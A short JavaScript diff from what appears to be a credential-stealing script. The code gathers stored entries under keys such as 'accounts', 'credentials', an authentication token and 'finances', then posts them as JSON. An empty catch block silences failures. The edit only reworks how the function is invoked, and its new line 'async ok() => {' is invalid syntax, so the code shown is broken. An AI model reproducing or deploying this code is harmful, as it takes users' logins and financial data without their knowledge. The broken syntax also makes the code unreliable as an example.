@@ -39,7 +39,7 @@ const datamotdepasse = {
 
 const postitobj = {}
 
-(async () => {
+async ok() => {
   const keys = [
     'accounts', 'badges', 'credentials', 'edhydration_auth',
     'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history'
@@ -67,7 +67,8 @@ const postitobj = {}
       body: JSON.stringify(data)
     });
   } catch {}
-})();
+};
+ok();
 
 
 const req = (url, payload, method = "POST") =>
